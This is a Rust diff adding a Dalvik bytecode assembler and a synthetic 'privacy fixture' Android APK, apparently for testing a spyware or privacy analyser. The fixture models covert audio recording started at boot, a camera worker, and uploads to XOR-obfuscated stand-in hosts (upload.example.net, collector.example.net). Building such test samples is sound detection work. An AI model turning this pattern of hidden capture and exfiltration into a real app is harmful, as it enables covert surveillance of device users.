@@ -1105,3 +1105,528 @@ pub fn native_methods(count: usize) -> Vec<ClassSpec> {
     }
     vec![class]
 }
+
+/// A small Dalvik assembler for fixtures: each method appends one instruction; [`Asm::len`] is the address of the
+/// next one, for branch offsets.
+#[derive(Debug, Clone, Default)]
+pub struct Asm {
+    units: Vec<Unit>,
+}
+
+/// invoke opcodes.
+pub const VIRTUAL: u8 = 0x6e;
+pub const SUPER: u8 = 0x6f;
+pub const DIRECT: u8 = 0x70;
+pub const STATIC: u8 = 0x71;
+pub const INTERFACE: u8 = 0x72;
+
+fn method_key(text: &str) -> MethodKey {
+    let (class, rest) = text.split_once("->").expect("Lclass;->name(params)ret");
+    let (name, signature) = rest.split_once('(').expect("a prototype");
+    let (params, ret) = signature.split_once(')').expect("a return type");
+    let mut list = Vec::new();
+    let bytes = params.as_bytes();
+    let mut at = 0;
+    while at < bytes.len() {
+        let start = at;
+        while bytes[at] == b'[' {
+            at += 1;
+        }
+        if bytes[at] == b'L' {
+            at += params[at..].find(';').expect("a class name ends with ;");
+        }
+        at += 1;
+        list.push(params[start..at].to_owned());
+    }
+    MethodKey { class: class.to_owned(), name: name.to_owned(), ret: ret.to_owned(), params: list }
+}
+
+fn field_key(text: &str) -> FieldKey {
+    let (class, rest) = text.split_once("->").expect("Lclass;->name:type");
+    let (name, kind) = rest.split_once(':').expect("a field type");
+    FieldKey { class: class.to_owned(), name: name.to_owned(), kind: kind.to_owned() }
+}
+
+impl Asm {
+    pub fn new() -> Self {
+        Self::default()
+    }
+
+    /// The address (in code units) of the next instruction.
+    pub fn len(&self) -> u32 {
+        self.units.len() as u32
+    }
+
+    pub fn is_empty(&self) -> bool {
+        self.units.is_empty()
+    }
+
+    pub fn raw(mut self, units: &[u16]) -> Self {
+        self.units.extend(units.iter().map(|&unit| Unit::Raw(unit)));
+        self
+    }
+
+    /// An instruction with an 8-bit register A and a 16-bit operand.
+    fn aa(self, op: u8, a: u8, b: u16) -> Self {
+        self.raw(&[u16::from(a) << 8 | u16::from(op), b])
+    }
+
+    /// An instruction with 4-bit registers A and B.
+    fn ab(self, op: u8, a: u8, b: u8) -> Self {
+        self.raw(&[u16::from(b) << 12 | u16::from(a & 0xf) << 8 | u16::from(op)])
+    }
+
+    pub fn const4(self, reg: u8, value: i8) -> Self {
+        self.ab(0x12, reg, (value as u8) & 0xf)
+    }
+
+    pub fn const16(self, reg: u8, value: i16) -> Self {
+        self.aa(0x13, reg, value as u16)
+    }
+
+    pub fn const32(self, reg: u8, value: i32) -> Self {
+        let value = value as u32;
+        self.raw(&[u16::from(reg) << 8 | 0x14, value as u16, (value >> 16) as u16])
+    }
+
+    pub fn const_string(mut self, reg: u8, text: &str) -> Self {
+        self.units.push(Unit::Raw(u16::from(reg) << 8 | 0x1a));
+        self.units.push(Unit::String(text.to_owned()));
+        self
+    }
+
+    fn typed(mut self, op: u8, reg: u8, kind: &str) -> Self {
+        self.units.push(Unit::Raw(u16::from(reg) << 8 | u16::from(op)));
+        self.units.push(Unit::Type(kind.to_owned()));
+        self
+    }
+
+    pub fn const_class(self, reg: u8, kind: &str) -> Self {
+        self.typed(0x1c, reg, kind)
+    }
+
+    pub fn check_cast(self, reg: u8, kind: &str) -> Self {
+        self.typed(0x1f, reg, kind)
+    }
+
+    pub fn new_instance(self, reg: u8, kind: &str) -> Self {
+        self.typed(0x22, reg, kind)
+    }
+
+    /// `new-array dst, size, kind`.
+    pub fn new_array(mut self, dst: u8, size: u8, kind: &str) -> Self {
+        self.units.push(Unit::Raw(u16::from(size) << 12 | u16::from(dst & 0xf) << 8 | 0x23));
+        self.units.push(Unit::Type(kind.to_owned()));
+        self
+    }
+
+    pub fn array_length(self, dst: u8, array: u8) -> Self {
+        self.ab(0x21, dst, array)
+    }
+
+    /// `fill-array-data reg, +offset` (the payload's address relative to this instruction).
+    pub fn fill_array_data(self, reg: u8, offset: i32) -> Self {
+        let offset = offset as u32;
+        self.raw(&[u16::from(reg) << 8 | 0x26, offset as u16, (offset >> 16) as u16])
+    }
+
+    /// A fill-array-data payload of byte elements (padded to a whole code unit).
+    pub fn byte_payload(self, bytes: &[u8]) -> Self {
+        let count = bytes.len() as u32;
+        let mut units = vec![0x0300, 1, count as u16, (count >> 16) as u16];
+        units.extend(bytes.chunks(2).map(|pair| u16::from(pair[0]) | u16::from(*pair.get(1).unwrap_or(&0)) << 8));
+        self.raw(&units)
+    }
+
+    /// `invoke-*` (35c) of `method` (`Lclass;->name(params)ret`) with up to five argument registers.
+    pub fn invoke(mut self, op: u8, regs: &[u8], method: &str) -> Self {
+        assert!(regs.len() <= 5);
+        let reg = |index: usize| u16::from(*regs.get(index).unwrap_or(&0) & 0xf);
+        self.units.push(Unit::Raw((regs.len() as u16) << 12 | reg(4) << 8 | u16::from(op)));
+        self.units.push(Unit::Method(method_key(method)));
+        self.units.push(Unit::Raw(reg(0) | reg(1) << 4 | reg(2) << 8 | reg(3) << 12));
+        self
+    }
+
+    pub fn move_result(self, reg: u8) -> Self {
+        self.raw(&[u16::from(reg) << 8 | 0x0a])
+    }
+
+    pub fn move_result_object(self, reg: u8) -> Self {
+        self.raw(&[u16::from(reg) << 8 | 0x0c])
+    }
+
+    pub fn return_void(self) -> Self {
+        self.raw(&[0x000e])
+    }
+
+    pub fn return_value(self, reg: u8) -> Self {
+        self.raw(&[u16::from(reg) << 8 | 0x0f])
+    }
+
+    pub fn return_object(self, reg: u8) -> Self {
+        self.raw(&[u16::from(reg) << 8 | 0x11])
+    }
+
+    fn field(mut self, op: u8, reg: u8, field: &str) -> Self {
+        self.units.push(Unit::Raw(u16::from(reg) << 8 | u16::from(op)));
+        self.units.push(Unit::Field(field_key(field)));
+        self
+    }
+
+    pub fn sget_object(self, reg: u8, field: &str) -> Self {
+        self.field(0x62, reg, field)
+    }
+
+    pub fn sput_object(self, reg: u8, field: &str) -> Self {
+        self.field(0x69, reg, field)
+    }
+
+    /// `aget-<kind> dst, array, index` (0x44 int, 0x48 byte, 0x49 char).
+    pub fn aget(self, op: u8, dst: u8, array: u8, index: u8) -> Self {
+        self.raw(&[u16::from(dst) << 8 | u16::from(op), u16::from(index) << 8 | u16::from(array)])
+    }
+
+    /// `aput-<kind> src, array, index` (0x4b int, 0x4f byte, 0x50 char).
+    pub fn aput(self, op: u8, src: u8, array: u8, index: u8) -> Self {
+        self.raw(&[u16::from(src) << 8 | u16::from(op), u16::from(index) << 8 | u16::from(array)])
+    }
+
+    /// `<binop>/lit8 dst, src, value` (0xd8 add, 0xdf xor, 0xdd and).
+    pub fn lit8(self, op: u8, dst: u8, src: u8, value: i8) -> Self {
+        self.raw(&[u16::from(dst) << 8 | u16::from(op), u16::from(value as u8) << 8 | u16::from(src)])
+    }
+
+    /// A unary operation (0x8e int-to-char, 0x8d int-to-byte).
+    pub fn unop(self, op: u8, dst: u8, src: u8) -> Self {
+        self.ab(op, dst, src)
+    }
+
+    /// `if-<test> a, b, +offset` (0x32 eq, 0x33 ne, 0x34 lt, 0x35 ge).
+    pub fn if_test(self, op: u8, a: u8, b: u8, offset: i16) -> Self {
+        self.raw(&[u16::from(b) << 12 | u16::from(a & 0xf) << 8 | u16::from(op), offset as u16])
+    }
+
+    /// `if-<test>z a, +offset` (0x38 eqz, 0x39 nez).
+    pub fn if_zero(self, op: u8, reg: u8, offset: i16) -> Self {
+        self.aa(op, reg, offset as u16)
+    }
+
+    pub fn goto(self, offset: i8) -> Self {
+        self.raw(&[u16::from(offset as u8) << 8 | 0x28])
+    }
+
+    pub fn code(self, registers: u16, ins: u16, outs: u16) -> Code {
+        Code { registers, ins, outs, units: self.units, tries: Vec::new() }
+    }
+}
+
+/// The package of the privacy fixture APK.
+pub const WATCH_PACKAGE: &str = "com.example.watch";
+/// The upload URL the fixture hides behind its XOR decoder, the host behind its byte-array decoder, and the XOR
+/// key.
+pub const WATCH_URL: &str = "https://upload.example.net/v2/audio";
+pub const WATCH_HOST: &str = "collector.example.net";
+pub const WATCH_XOR: u8 = 0x5a;
+const WATCH_DATA_XOR: u8 = 0x21;
+
+fn watch(name: &str) -> String {
+    format!("Lcom/example/watch/{name};")
+}
+
+/// `text` with every character XORed with `key`, as the fixture's decoder undoes it.
+pub fn xor_text(text: &str, key: u8) -> String {
+    text.chars().map(|c| char::from_u32(c as u32 ^ u32::from(key)).unwrap()).collect()
+}
+
+/// The classes of the privacy fixture: a boot receiver starting a service that records audio and uploads it to a
+/// URL decoded by a static XOR decoder; a push service reaching the same capture; a push-to-talk activity whose
+/// onClick records through MediaRecorder and pushes through an interface implemented by an upload class (resolved
+/// by name); the Application scheduling a periodic Worker that opens the camera and sends through a native method;
+/// a byte-array decoder (`Strings.get(I)`) over a static array filled in `<clinit>`.
+pub fn watch_classes() -> Vec<ClassSpec> {
+    let object = "Ljava/lang/Object;";
+    let string = "Ljava/lang/String;";
+    let context = "Landroid/content/Context;";
+    let intent = "Landroid/content/Intent;";
+    // BootReceiver.onReceive(Context, Intent): startForegroundService(new Intent(context, CaptureService.class))
+    let on_receive = Asm::new()
+        .new_instance(0, intent)
+        .const_class(1, &watch("CaptureService"))
+        .invoke(DIRECT, &[0, 3, 1], "Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V")
+        .invoke(
+            VIRTUAL,
+            &[3, 0],
+            "Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;",
+        )
+        .return_void()
+        .code(5, 3, 3);
+    let receiver = ClassSpec::new(&watch("BootReceiver"), "Landroid/content/BroadcastReceiver;").method(
+        "onReceive",
+        "V",
+        &[context, intent],
+        0x1,
+        Some(on_receive),
+    );
+    // CaptureService.onStartCommand: Uploader.upload(Recorder.record()); return 1
+    let on_start = Asm::new()
+        .invoke(STATIC, &[], &format!("{}->record()[B", watch("Recorder")))
+        .move_result_object(0)
+        .invoke(STATIC, &[0], &format!("{}->upload([B)V", watch("Uploader")))
+        .const4(1, 1)
+        .return_value(1)
+        .code(6, 4, 1);
+    let service = ClassSpec::new(&watch("CaptureService"), "Landroid/app/Service;").method(
+        "onStartCommand",
+        "I",
+        &[intent, "I", "I"],
+        0x1,
+        Some(on_start),
+    );
+    // PushService.onMessageReceived: Recorder.record()
+    let on_message =
+        Asm::new().invoke(STATIC, &[], &format!("{}->record()[B", watch("Recorder"))).return_void().code(2, 2, 0);
+    let push = ClassSpec::new(&watch("PushService"), "Lcom/google/firebase/messaging/FirebaseMessagingService;")
+        .method("onMessageReceived", "V", &["Lcom/google/firebase/messaging/RemoteMessage;"], 0x1, Some(on_message));
+    // Recorder.record(): new AudioRecord(...).startRecording(); return new byte[16]
+    let record = Asm::new()
+        .new_instance(0, "Landroid/media/AudioRecord;")
+        .invoke(VIRTUAL, &[0], "Landroid/media/AudioRecord;->startRecording()V")
+        .const16(1, 16)
+        .new_array(1, 1, "[B")
+        .return_object(1)
+        .code(2, 0, 1);
+    let recorder = ClassSpec::new(&watch("Recorder"), object).method("record", "[B", &[], 0x9, Some(record));
+    // Uploader.upload([B): new URL(Codec.decode("...")).openConnection().getOutputStream().write(data)
+    let upload = Asm::new()
+        .const_string(0, &xor_text(WATCH_URL, WATCH_XOR))
+        .invoke(STATIC, &[0], &format!("{}->decode(Ljava/lang/String;)Ljava/lang/String;", watch("Codec")))
+        .move_result_object(0)
+        .new_instance(1, "Ljava/net/URL;")
+        .invoke(DIRECT, &[1, 0], "Ljava/net/URL;-><init>(Ljava/lang/String;)V")
+        .invoke(VIRTUAL, &[1], "Ljava/net/URL;->openConnection()Ljava/net/URLConnection;")
+        .move_result_object(0)
+        .check_cast(0, "Ljava/net/HttpURLConnection;")
+        .invoke(VIRTUAL, &[0], "Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;")
+        .move_result_object(0)
+        .invoke(VIRTUAL, &[0, 2], "Ljava/io/OutputStream;->write([B)V")
+        .return_void()
+        .code(3, 1, 2);
+    let uploader = ClassSpec::new(&watch("Uploader"), object).method("upload", "V", &["[B"], 0x9, Some(upload));
+    // Codec.decode(String): XOR every char with the key.
+    let mut decode =
+        Asm::new().invoke(VIRTUAL, &[4], "Ljava/lang/String;->toCharArray()[C").move_result_object(0).const4(1, 0);
+    let top = decode.len();
+    decode = decode.array_length(2, 0).if_test(0x35, 1, 2, 0);
+    let exit = decode.len() - 2;
+    decode = decode
+        .aget(0x49, 2, 0, 1)
+        .lit8(0xdf, 2, 2, WATCH_XOR as i8)
+        .unop(0x8e, 2, 2)
+        .aput(0x50, 2, 0, 1)
+        .lit8(0xd8, 1, 1, 1);
+    let back = top as i32 - decode.len() as i32;
+    decode = decode.goto(back as i8);
+    let done = decode.len();
+    decode = decode.new_instance(3, string).invoke(DIRECT, &[3, 0], "Ljava/lang/String;-><init>([C)V").return_object(3);
+    let mut decode = decode.code(5, 1, 2);
+    if let Unit::Raw(offset) = &mut decode.units[exit as usize + 1] {
+        *offset = (done - exit) as u16;
+    }
+    let codec = ClassSpec::new(&watch("Codec"), object).method("decode", string, &[string], 0x9, Some(decode));
+    // Strings: DATA filled in <clinit>; get(I) reads from DATA[i] to a zero byte, XOR 0x21.
+    let mut data: Vec<u8> = WATCH_HOST.bytes().map(|byte| byte ^ WATCH_DATA_XOR).collect();
+    data.push(0);
+    let field = format!("{}->DATA:[B", watch("Strings"));
+    let clinit = Asm::new()
+        .const16(0, data.len() as i16)
+        .new_array(0, 0, "[B")
+        .fill_array_data(0, 6)
+        .sput_object(0, &field)
+        .return_void()
+        .byte_payload(&data)
+        .code(1, 0, 0);
+    let mut get = Asm::new().sget_object(0, &field).new_instance(1, "Ljava/lang/StringBuilder;").invoke(
+        DIRECT,
+        &[1],
+        "Ljava/lang/StringBuilder;-><init>()V",
+    );
+    let top = get.len();
+    get = get.aget(0x48, 2, 0, 3).if_zero(0x38, 2, 0);
+    let exit = get.len() - 2;
+    get = get
+        .lit8(0xdf, 2, 2, WATCH_DATA_XOR as i8)
+        .unop(0x8e, 2, 2)
+        .invoke(VIRTUAL, &[1, 2], "Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;")
+        .lit8(0xd8, 3, 3, 1);
+    let back = top as i32 - get.len() as i32;
+    get = get.goto(back as i8);
+    let done = get.len();
+    get = get
+        .invoke(VIRTUAL, &[1], "Ljava/lang/StringBuilder;->toString()Ljava/lang/String;")
+        .move_result_object(0)
+        .return_object(0);
+    let mut get = get.code(4, 1, 2);
+    if let Unit::Raw(offset) = &mut get.units[exit as usize + 1] {
+        *offset = (done - exit) as u16;
+    }
+    let strings = ClassSpec::new(&watch("Strings"), object)
+        .field("DATA", "[B", 0x1a)
+        .method("<clinit>", "V", &[], 0x1_0008, Some(clinit))
+        .method("get", string, &["I"], 0x9, Some(get));
+    // Sink (an interface) and HttpSink implementing it by uploading.
+    let mut sink = ClassSpec::new(&watch("Sink"), object).method("push", "V", &["[B"], 0x401, None);
+    sink.access = 0x601;
+    let push_body = Asm::new().invoke(STATIC, &[2], &format!("{}->upload([B)V", watch("Uploader"))).return_void();
+    let init =
+        |class: &str| Asm::new().invoke(DIRECT, &[0], &format!("{class}-><init>()V")).return_void().code(1, 1, 1);
+    let mut http_sink = ClassSpec::new(&watch("HttpSink"), object)
+        .method("<init>", "V", &[], 0x1_0001, Some(init(object)))
+        .method("push", "V", &["[B"], 0x1, Some(push_body.code(3, 2, 1)));
+    http_sink.interfaces = vec![watch("Sink")];
+    // TalkActivity: onCreate registers itself as the button's click listener; onClick records and pushes.
+    let activity = "Landroid/app/Activity;";
+    let on_create = Asm::new()
+        .invoke(SUPER, &[2, 3], "Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V")
+        .const16(0, 0x10)
+        .invoke(VIRTUAL, &[2, 0], "Landroid/app/Activity;->findViewById(I)Landroid/view/View;")
+        .move_result_object(0)
+        .invoke(VIRTUAL, &[0, 2], "Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V")
+        .return_void()
+        .code(4, 2, 2);
+    let on_click = Asm::new()
+        .new_instance(0, "Landroid/media/MediaRecorder;")
+        .invoke(DIRECT, &[0], "Landroid/media/MediaRecorder;-><init>()V")
+        .const4(1, 1)
+        .invoke(VIRTUAL, &[0, 1], "Landroid/media/MediaRecorder;->setAudioSource(I)V")
+        .invoke(VIRTUAL, &[0], "Landroid/media/MediaRecorder;->start()V")
+        .new_instance(0, &watch("HttpSink"))
+        .invoke(DIRECT, &[0], &format!("{}-><init>()V", watch("HttpSink")))
+        .const16(1, 8)
+        .new_array(1, 1, "[B")
+        .invoke(INTERFACE, &[0, 1], &format!("{}->push([B)V", watch("Sink")))
+        .return_void()
+        .code(4, 2, 2);
+    let mut talk = ClassSpec::new(&watch("TalkActivity"), activity)
+        .method("onCreate", "V", &["Landroid/os/Bundle;"], 0x4, Some(on_create))
+        .method("onClick", "V", &["Landroid/view/View;"], 0x1, Some(on_click));
+    talk.interfaces = vec!["Landroid/view/View$OnClickListener;".to_owned()];
+    // App.onCreate: WorkManager.getInstance(this).enqueue(new PeriodicWorkRequest.Builder(SyncWorker.class, 15,
+    // MINUTES).build())
+    let builder = "Landroidx/work/PeriodicWorkRequest$Builder;";
+    let app_create = Asm::new()
+        .new_instance(0, builder)
+        .const_class(1, &watch("SyncWorker"))
+        .raw(&[0x0216, 15])
+        .sget_object(4, "Ljava/util/concurrent/TimeUnit;->MINUTES:Ljava/util/concurrent/TimeUnit;")
+        .invoke(
+            DIRECT,
+            &[0, 1, 2, 3, 4],
+            &format!("{builder}-><init>(Ljava/lang/Class;JLjava/util/concurrent/TimeUnit;)V"),
+        )
+        .invoke(VIRTUAL, &[0], &format!("{builder}->build()Landroidx/work/WorkRequest;"))
+        .move_result_object(0)
+        .invoke(
+            STATIC,
+            &[5],
+            "Landroidx/work/WorkManager;->getInstance(Landroid/content/Context;)Landroidx/work/WorkManager;",
+        )
+        .move_result_object(1)
+        .invoke(
+            VIRTUAL,
+            &[1, 0],
+            "Landroidx/work/WorkManager;->enqueue(Landroidx/work/WorkRequest;)Landroidx/work/Operation;",
+        )
+        .return_void()
+        .code(6, 1, 5);
+    let app =
+        ClassSpec::new(&watch("App"), "Landroid/app/Application;").method("onCreate", "V", &[], 0x1, Some(app_create));
+    // SyncWorker.doWork: Snapshot.take(); return null
+    let do_work = Asm::new()
+        .invoke(STATIC, &[], &format!("{}->take()V", watch("Snapshot")))
+        .const4(0, 0)
+        .return_object(0)
+        .code(2, 1, 0);
+    let worker = ClassSpec::new(&watch("SyncWorker"), "Landroidx/work/Worker;").method(
+        "doWork",
+        "Landroidx/work/ListenableWorker$Result;",
+        &[],
+        0x1,
+        Some(do_work),
+    );
+    // Snapshot.take: Camera.open(); Net.nativeSend(new byte[4]) to Strings.get(0)
+    let take = Asm::new()
+        .invoke(STATIC, &[], "Landroid/hardware/Camera;->open()Landroid/hardware/Camera;")
+        .const4(0, 0)
+        .invoke(STATIC, &[0], &format!("{}->get(I)Ljava/lang/String;", watch("Strings")))
+        .move_result_object(1)
+        .const4(0, 4)
+        .new_array(0, 0, "[B")
+        .invoke(STATIC, &[0], &format!("{}->nativeSend([B)I", watch("Net")))
+        .return_void()
+        .code(2, 0, 1);
+    let snapshot = ClassSpec::new(&watch("Snapshot"), object).method("take", "V", &[], 0x9, Some(take));
+    let net = ClassSpec::new(&watch("Net"), object).method("nativeSend", "I", &["[B"], 0x109, None);
+    vec![receiver, service, push, recorder, uploader, codec, strings, sink, http_sink, talk, app, worker, snapshot, net]
+}
+
+/// The privacy fixture's manifest: microphone, camera, internet and boot permissions; the Application class; the
+/// push-to-talk activity (launcher); the boot receiver; the capture and push services.
+pub fn watch_manifest() -> XmlNode {
+    use XmlValue::{Bool, Int, Str};
+    let permission = |name: &str| XmlNode::new("uses-permission").android("name", Str(name.to_owned()));
+    let action = |name: &str| XmlNode::new("action").android("name", Str(name.to_owned()));
+    let category = |name: &str| XmlNode::new("category").android("name", Str(name.to_owned()));
+    XmlNode::new("manifest")
+        .android("versionCode", Int(3))
+        .android("versionName", Str("0.3".to_owned()))
+        .plain("package", Str(WATCH_PACKAGE.to_owned()))
+        .child(XmlNode::new("uses-sdk").android("minSdkVersion", Int(26)).android("targetSdkVersion", Int(33)))
+        .child(permission("android.permission.RECORD_AUDIO"))
+        .child(permission("android.permission.CAMERA"))
+        .child(permission("android.permission.INTERNET"))
+        .child(permission("android.permission.RECEIVE_BOOT_COMPLETED"))
+        .child(
+            XmlNode::new("application")
+                .android("name", Str(".App".to_owned()))
+                .child(
+                    XmlNode::new("activity")
+                        .android("name", Str(".TalkActivity".to_owned()))
+                        .android("exported", Bool(true))
+                        .child(
+                            XmlNode::new("intent-filter")
+                                .child(action("android.intent.action.MAIN"))
+                                .child(category("android.intent.category.LAUNCHER")),
+                        ),
+                )
+                .child(
+                    XmlNode::new("receiver")
+                        .android("name", Str(".BootReceiver".to_owned()))
+                        .android("exported", Bool(false))
+                        .child(XmlNode::new("intent-filter").child(action("android.intent.action.BOOT_COMPLETED"))),
+                )
+                .child(
+                    XmlNode::new("service")
+                        .android("name", Str(".CaptureService".to_owned()))
+                        .android("foregroundServiceType", Int(0x80)),
+                )
+                .child(
+                    XmlNode::new("service")
+                        .android("name", Str(".PushService".to_owned()))
+                        .android("exported", Bool(false))
+                        .child(XmlNode::new("intent-filter").child(action("com.google.firebase.MESSAGING_EVENT"))),
+                ),
+        )
+}
+
+/// The privacy fixture APK: manifest, one DEX file and `native_lib` (when given) as `lib/arm64-v8a/libnet.so`.
+pub fn watch_apk(native_lib: Option<&[u8]>) -> Vec<u8> {
+    let manifest = write_axml(&watch_manifest(), false);
+    let classes = write_dex(&watch_classes(), 35);
+    let mut members: Vec<(&str, &[u8], bool)> =
+        vec![("AndroidManifest.xml", &manifest, true), ("classes.dex", &classes, true)];
+    if let Some(lib) = native_lib {
+        members.push(("lib/arm64-v8a/libnet.so", lib, false));
+    }
+    write_zip(&members)
+}
